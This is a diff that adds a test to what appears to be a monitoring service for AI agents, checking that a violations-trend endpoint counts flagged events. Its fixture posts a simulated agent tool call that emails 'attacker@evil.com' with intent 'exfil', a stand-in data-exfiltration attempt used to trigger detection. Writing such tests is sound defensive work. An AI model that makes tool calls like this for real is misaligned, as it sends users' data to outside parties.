@@ -103,6 +103,17 @@ def test_webhook_endpoints_and_audit_fires_it(client, monkeypatch):
     r2 = client.delete("/webhooks", headers=h)
     assert r2.status_code == 200 and client.get("/webhooks", headers=h).json()["url"] is None
 
+def test_violation_trend_endpoint(client):
+    org = create_org("Acme", "u1")
+    key = create_api_key(org, "ci")
+    h = {"Authorization": f"Bearer {_jwt('u1')}"}
+    client.post("/events", json={"agent_id": "a", "session_id": "trend", "kind": "tool_call",
+                "tool": "send_email", "args": {"to": "attacker@evil.com"}, "intent": "exfil"},
+                headers={"Authorization": f"Bearer {key}"})
+    client.post("/audit/trend", headers=h)
+    trend = client.get("/stats/violations?days=7", headers=h).json()
+    assert len(trend) == 7 and trend[-1]["violations"] >= 1
+
 def test_policy_framework_selection_changes_which_rules_apply(client):
     org = create_org("Acme", "u1")
     key = create_api_key(org, "ci")
